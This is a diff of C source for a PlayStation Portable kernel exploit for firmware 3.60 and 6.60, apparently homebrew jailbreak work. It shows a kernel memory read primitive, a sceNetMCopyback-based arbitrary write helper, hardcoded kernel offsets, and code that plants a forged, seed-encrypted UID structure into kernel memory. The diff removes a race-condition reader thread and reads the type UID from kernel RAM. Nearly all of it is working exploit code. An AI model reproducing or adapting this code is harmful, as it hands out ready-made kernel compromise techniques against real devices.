@@ -28,67 +28,19 @@ Put together by Acid_Snake and meetpatty.
 #define SYSMEM_SEED_OFFSET_365 0x88014E38
 #define SYSMEM_SEED_OFFSET_CHECK SYSMEM_TEXT+0x00002FA8
 
-#define TYPE_UID_OFFSET_660 0x880164c0
-#define TYPE_UID_OFFSET_360 0x88016dc0
+//#define TYPE_UID_OFFSET_660 0x880164c0
+//#define TYPE_UID_OFFSET_360 0x88016dc0
 
 #define FAKE_UID_OFFSET        0x80
 
 UserFunctions* g_tbl = NULL;
-//int (*_sceNpCore_8AFAB4A0)(int *input, char *string, int length);
+static int libc_clock_offset = LIBC_CLOCK_OFFSET_360;
 void (*_sceNetMCopyback_1560F143)(uint32_t * a0, uint32_t a1, uint32_t a2, uint32_t a3);
 
 /* Actual code to trigger the kram read vulnerability.
     We can read the value stored at any location in Kram.
 */
-static volatile int running;
-static volatile int idx;
-static int input[3];
-static int libc_clock_offset = LIBC_CLOCK_OFFSET_360;
 
-static int racer(SceSize args, void *argp) {
-  running = 1;
-
-  while (running) {
-    input[1] = 0;
-    g_tbl->KernelDelayThread(10);
-    input[1] = idx;
-    g_tbl->KernelDelayThread(10);
-  }
-
-  return g_tbl->KernelExitDeleteThread(0);
-}
-/*u32 readKram(u32 addr){
-  SceUID thid = g_tbl->KernelCreateThread("", racer, 8, 0x1000, 0, NULL);
-  if (thid < 0)
-    return 0;
-
-  g_tbl->KernelStartThread(thid, 0, NULL);
-
-  char string[8];
-  int round = 0;
-
-  idx = -83; // relative offset 0xB00 in np_core.prx (0xD98 + (-83 << 3))
-
-  int i;
-  for (i = 0; i < 100000; i++) {
-    u32 res = _sceNpCore_8AFAB4A0(input, string, sizeof(string));
-    if (res != 5 && res != 0x80550203) {
-      switch (round) {
-        case 0:
-          round = 1;
-          idx = (addr - (res - 0xA74) - 0xD98) >> 3;
-          break;
-        case 1:
-          running = 0;
-          return res;
-      }
-    }
-  }
-
-  running = 0;
-  return 0;
-}
-*/
 int sceNetMCopyback_exploit_helper(uint32_t addr, uint32_t value, uint32_t seed) {
 	uint32_t a0[7];
 	a0[0] = addr - 12;
@@ -160,10 +112,9 @@ int stubScanner(UserFunctions* tbl){
     g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON);
     g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);
     g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
-    //_sceNpCore_8AFAB4A0 = tbl->FindImportUserRam("sceNpCore", 0x8AFAB4A0);
-	_sceNetMCopyback_1560F143 = tbl->FindImportUserRam("sceNetIfhandle_lib", 0x1560F143);
+	  _sceNetMCopyback_1560F143 = tbl->FindImportUserRam("sceNetIfhandle_lib", 0x1560F143);
 
-    return 0;
+    return (_sceNetMCopyback_1560F143==NULL);
 }
 
 /*
@@ -174,7 +125,7 @@ int doExploit(void) {
 
     int res;
     u32 seed = 0;
-    u32 type_uid = TYPE_UID_OFFSET_360;
+    //u32 type_uid = TYPE_UID_OFFSET_360;
 
     if (_sceNetMCopyback_1560F143 != NULL){
       u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
@@ -185,7 +136,7 @@ int doExploit(void) {
       }
       else if (test_val == 0x8FBF003C){
         libc_clock_offset = LIBC_CLOCK_OFFSET_660;
-        type_uid = TYPE_UID_OFFSET_660;
+        //type_uid = TYPE_UID_OFFSET_660;
         PRTSTR("PSP 6.60");
       }
       else {
@@ -205,6 +156,8 @@ int doExploit(void) {
     u32 newaddr = dummyaddr - FAKE_UID_OFFSET;
     SceUID uid = (((newaddr & 0x00ffffff) >> 2) << 7) | 0x1;
     SceUID encrypted_uid = uid ^ seed; // encrypt UID, if there's none then A^0=A
+
+    u32 type_uid = readKram(dummyaddr+8);
 
     // Plant UID data structure into kernel as string
     u32 string[] = { libc_clock_offset - 4, 0x88888888, type_uid, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
